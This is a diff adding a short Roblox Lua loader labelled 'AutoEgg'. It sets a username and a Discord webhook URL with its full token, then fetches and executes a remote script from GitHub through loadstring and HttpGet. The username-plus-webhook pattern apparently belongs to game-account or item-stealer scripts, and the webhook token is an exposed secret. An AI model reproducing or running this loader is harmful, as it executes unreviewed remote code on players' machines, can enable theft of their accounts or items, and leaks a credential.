@@ -1,0 +1,7 @@
+_G.Username = "arsenbulantaev07"
+
+_G.HubName = "AutoEgg"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095400406789652611/uUzJ466h9Pe_TFVGctw7h5qXnEYM4LXmY9qx57OD7b8Edqe9Js0z3e18LLvV4DnEMCvY"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
